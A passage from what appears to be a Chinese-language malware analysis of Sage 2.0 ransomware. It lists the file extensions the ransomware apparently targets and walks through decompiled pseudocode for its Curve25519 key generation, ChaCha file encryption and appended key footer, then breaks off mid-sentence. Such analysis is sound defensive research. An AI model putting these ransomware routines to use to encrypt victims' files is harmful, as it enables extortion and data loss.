    .npc .qbmb .sba .cfp .nv2 .tfx .n43 .let .tt12 .210 .dac .slp .qb20 .saj .zdb
    .tt15 .ssg .t09 .epa .qch .pd6 .rdy .sic .ta1 .lmr .pr5 .op .sdy .brw .vnd .esv
    .kd3 .vmb .qph .t08 .qel .m12 .pvc .q43 .etq .u12 .hsr .ati .t00 .mmw .bd2 .ac2
    .qpb .tt11 .zix .ec8 .nv .lid .qmtf .hif .lld .quic .mbsb .nl2 .qml .wac .cf8
    .vbpf .m10 .qix .t04 .qpg .quo .ptdb .gto .pr0 .vdf .q01 .fcr .gnc .ldc .t05
    .t06 .tom .tt10 .qb1 .t01 .rpf .t02 .tax1 .1pe .skg .pls .t03 .xaa .dgc .mnp
    .qdt .mn8 .ptk .t07 .chg .#vc .qfi .acc .m11 .kb7 .q09 .esk .09i .cpw .sbf .mql
    .dxi .kmo .md .u11 .oet .ta8 .efs .h12 .mne .ebd .fef .qpi .mn5 .exp .m16 .09t
    .00c .qmt .cfdi .u10 .s12 .qme .int? .cf9 .ta5 .u08 .mmb .qnx .q07 .tb2 .say
    .ab4 .pma .defx .tkr .q06 .tpl .ta2 .qob .m15 .fca .eqb .q00 .mn4 .lhr .t99
    .mn9 .qem .scd .mwi .mrq .q98 .i2b .mn6 .q08 .kmy .bk2 .stm .mn1 .bc8 .pfd .bgt
    .hts .tax0 .cb .resx .mn7 .08i .mn3 .ch .meta .07i .rcs .dtl .ta9 .mem .seam
    .btif .11t .efsl .$ac .emp .imp .fxw .sbc .bpw .mlb .10t .fa1 .saf .trm .fa2
    .pr2 .xeq .sbd .fcpa .ta6 .tdr .acm .lin .dsb .vyp .emd .pr1 .mn2 .bpf .mws
    .h11 .pr3 .gsb .mlc .nni .cus .ldr .ta4 .inv .omf .reb .qdfx .pg .coa .rec .rda
    .ffd .ml2 .ddd .ess .qbmd .afm .d07 .vyr .acr .dtau .ml9 .bd3 .pcif .cat .h10
    .ent .fyc .p08 .jsd .zka .hbk .mone .pr4 .qw5 .cdf .gfi .cht .por .qbz .ens
    .3pe .pxa .intu .trn .3me .07g .jsda .2011 .fcpr .qwmo .t12 .pfx .p7b .der .nap
    .p12 .p7c .crt .csr .pem .gpg .key
**加密过程**
勒索软件最有趣的部分莫过于文件的加密过程。在勒索软件中，Sage 2.0是非常特别的一个存在，因为它采用了椭圆曲线加密算法对文件进行加密。
加密所使用的椭圆曲线函数是“y^2 = x^3 + 486662x^x + x”，使用的素数范围是“2^255 –
19”，基数变量x=9。Sage所采用的椭圆曲线是著名的Curve25519曲线，是现代密码学中最先进的技术。Curve25519不仅是最快的ECC（Elliptic
Curve Cryptography，椭圆曲线加密算法）曲线之一，也不易受到弱RNG（Random Number
Generator，随机数生成器）的影响，设计时考虑了侧信道攻击，避免了许多潜在的实现缺陷，并且很有可能不存在第三方内置后门。
Sage将Curve25519算法与硬编码的公钥一起使用生成共享密钥。主密钥生成算法如下所示（结构体和函数名由我们重新命名）：
    int __cdecl GenerateMainKey(curve_key *result, const void *publicKey)
    {
      char mysecret[32]; // [esp+4h] [ebp-40h]@1
      char shared[32]; // [esp+24h] [ebp-20h]@1
      result->flag = 1;
      GenerateCurve25519SecretKey(mysecret);
      ComputeCurve25519MatchingPublicKey(result->gpk, mysecret);
      ComputeCurve25519SharedSecret(shared, mysecret, publicKey);
      ConvertBytesToCurve22519SecretKey(shared);
      ComputeCurve25519MatchingPublicKey(result->pk, shared);
      return 0;
    }
这段代码看起来像是基于ECC的DH密钥交换协议（ECDH，Elliptic Curve Diffie-Hellman）的实现代码，但其中没有任何保存算法私钥的流程（私钥只用于数据解密用途，可由软件作者可以使用自己的私钥随时创建）。
代码中复杂的函数只是ECC函数（我们称之为CurveEncrypt函数）的封装而已。例如，计算匹配公钥的函数是curve25519(secretKey,
basePoint)，其中basePoint等于9（即9后面跟31个零）。
    int __cdecl ComputeCurve25519MatchingPublicKey(char *outPtr, char *randbytes)
    {
      char key[32]; // [esp+8h] [ebp-20h]@1
      qmemcpy(key, &Curve25519BasePoint, sizeof(key));
      key[31] = Curve25519BasePointEnd & 0x7F;
      return CurveEncrypt(outPtr, randbytes, key);
    }
共享密钥的计算与之类似，不同的是所使用的是公钥而不是常数基数，如下：
    int __cdecl ComputeCurve25519SharedSecret(char *shared, char *mySecret, const void *otherPublicKey)
    {
      char a3a[32]; // [esp+8h] [ebp-20h]@1
      qmemcpy(a3a, otherPublicKey, sizeof(a3a));
      a3a[31] &= 0x7Fu;
      return CurveEncrypt(shared, mySecret, a3a);
    }
得益于Curve25519的精妙设计，任意序列随机字节与密钥之间的相互转换是非常容易的，只需要对几个比特进行修改就已足够：
    curve_key *__cdecl ConvertBytesToCurve22519SecretKey(curve_key *a1)
    {
      curve_key *result; // eax@1
      char v2; // cl@1
      result = a1;
      v2 = a1->gpk[31];
      result->gpk[0] &= 248u;
      a1->gpk[31] = v2 & 0x3F | 0x40;
      return result;
    }
同理，私钥的生成也非常容易，只需要生成一个32字节的随机数，将其转换为私钥即可：
    int __cdecl GenerateCurve25519SecretKey(_BYTE *buffer)
    {
      char v1; // al@1
      getSecureRandom(32, (int)buffer);
      v1 = buffer[31];
      *buffer &= 248u;
      buffer[31] = v1 & 0x3F | 0x40;
      return 0;
    }
以上就是密钥生成的全部流程。至于文件加密流程，Sage首先是使用Curve25519对文件进行首次加密，再利用ChaCha算法进行后续加密（同样也是非常规加密方法），加密密钥附在输出文件的尾部：
    GenerateCurve25519SecretKey(&secretKey);
    ComputeCurve25519MatchingPublicKey(pubKey, &secretKey);
    ComputeCurve25519SharedSecret(sharedSecret, &secretKey, ellipticCurveKey->pk);
    //
    ChaChaInit(&chaCha20key, (unsigned __int8 *)sharedSecret, (unsigned __int8 *)minikey);
    while (bytesLeftToRead) {
        // Read from file to lpBuff
        ChaChaEncrypt(&chaCha20key, lpBuff, lpBuff, numBytesRead);
        // Write from file to lpBuff
    }
    AppendFileKeyInfo(hFile_1, ellipticCurveKey, &FileSize, pubKey, a5);
AppendFileKeyInfo函数的功能是将共享密钥和pubKey附加到文件尾部：
    int __cdecl AppendFileKeyInfo(HANDLE hFile, curve_key *sharedKey, DWORD *dataSize, char *pubKey, int a5)
    {
      DWORD dataSizeV; // edx@1
      int result; // eax@3
      _DWORD buffer[24]; // [esp+8h] [ebp-60h]@1
      buffer[0] = 0x5A9EDEAD;
      qmemcpy(&buffer[1], sharedKey, 0x20u);
      qmemcpy(&buffer[9], pubKey, 0x20u);
      dataSizeV = *dataSize;
      buffer[19] = dataSize[1];
      buffer[18] = dataSizeV;
      buffer[21] = a5;
      buffer[20] = 0;
      buffer[22] = 0x5A9EBABE;
      if ( WriteFile(hFile, buffer, 0x60u, (LPDWORD)&sharedKey, 0) && sharedKey == (curve_key *)96 )
        result = 0;
      else
        result = -5;
      return result;
    }
ChaCha并不是勒索软件常用的算法，它与Salsa20算法紧密相关（勒索软件Petya用的就是Salsa20算法）。我们并不知道为何Sage不适用AES，有可能它只是想特立独行而已。
换而言之，对于每一个加密文件，都对应有两组密钥+一个密钥对，对应关系如下所示：
    my_secret 